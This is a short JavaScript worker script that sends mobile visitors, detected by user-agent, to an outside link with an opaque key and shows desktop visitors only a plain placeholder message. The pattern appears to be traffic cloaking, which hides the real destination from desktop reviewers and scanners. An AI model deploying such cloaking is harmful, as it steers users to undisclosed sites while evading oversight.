export default {
  async fetch(request, env, ctx) {
    const userAgent = request.headers.get("user-agent") || "";

    const isMobile =
      /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
        userAgent
      );

    if (isMobile) {
      return Response.redirect(
        "https://acorntar.com/mxxcdagb?key=e6e8236c6980d94ca8e81d0b03ea93df",
        302
      );
    }

    return new Response("Desktop request received", {
      status: 200,
      headers: {
        "content-type": "text/plain;charset=UTF-8",
      },
    });
  },
};
